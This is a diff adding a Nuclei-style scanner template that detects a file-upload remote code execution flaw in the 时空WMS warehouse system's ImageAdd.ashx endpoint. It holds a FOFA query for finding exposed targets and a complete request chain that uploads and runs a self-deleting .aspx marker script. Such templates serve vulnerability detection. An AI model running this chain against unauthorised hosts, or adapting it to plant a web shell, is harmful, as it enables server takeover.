@@ -1,0 +1,56 @@
+id: shikongWMS-ImageAdd_ashx-File-upload
+
+info:
+  name: "时空WMS-仓储精细化管理系统 ImageAdd.ashx 文件上传远程代码执行"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="SKControlKLForJson.ashx"
+      时空WMS-仓储精细化管理系统在ImageAdd.ashx文件上传接口中存在安全缺陷，攻击者可利用该漏洞在目标服务器上执行任意代码，部署恶意负载，从而实现对Web服务器的完全控制。该漏洞源于未对上传文件进行有效验证，允许非授权用户通过构造特定请求实现远程代码执行。
+  reference:
+  - https://mp.weixin.qq.com/s/tLEnx-HnYuEzb_m7jV09eg?token=523748735&lang=zh_CN
+  tags: 时空WMS
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /ImageUpload/ImageAdd.ashx HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+    Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryssh7UfnPpGU7BXfK
+    Upgrade-Insecure-Requests: 1
+    Accept-Encoding: gzip
+
+    ------WebKitFormBoundaryssh7UfnPpGU7BXfK
+    Content-Disposition: form-data; name="file"; filename="{{username}}.aspx"
+    Content-Type: text/plain
+
+    <%@Page Language="C#"%><%Response.Write("pboyjnnrfipmplsukdeczudsefxmywe");System.IO.File.Delete(Request.PhysicalPath);%>
+    ------WebKitFormBoundaryssh7UfnPpGU7BXfK--
+  extractors:
+  - type: regex
+    part: body
+    name: uploadfile
+    group: 1
+    regex:
+    - '([0-9]+/\w+\.aspx)'
+    internal: true
+- raw:
+  - |
+    GET /upload/{{uploadfile}} HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'pboyjnnrfipmplsukdeczudsefxmywe'
+  - type: status
+    status:
+    - 200
